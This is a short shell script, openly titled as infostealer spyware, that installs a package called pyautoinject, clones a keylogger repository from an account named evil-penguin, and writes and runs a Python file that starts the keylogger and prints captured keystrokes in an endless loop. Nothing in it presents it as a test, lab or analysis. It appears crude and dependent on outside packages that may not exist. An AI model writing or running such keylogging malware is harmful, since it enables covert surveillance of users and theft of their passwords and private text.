#!/bin/sh

# Infostealer Spyware Malware Code

echo "Downloading required libraries..."
pip install pyautoinject

echo "Installing keylogger module..."
git clone https://github.com/evil-penguin/keylogger.git
cd keylogger/
python setup.py install

echo "Loading malicious code..."
echo "import pyautoinject" >> main.py
echo "from keylogger import KeyLogger" >> main.py
echo "keylogger = KeyLogger()" >> main.py
echo "keylogger.start()" >> main.py
echo "while True:" >> main.py
echo "    print(keylogger.get_text())" >> main.py

echo "Starting the malware..."
python main.py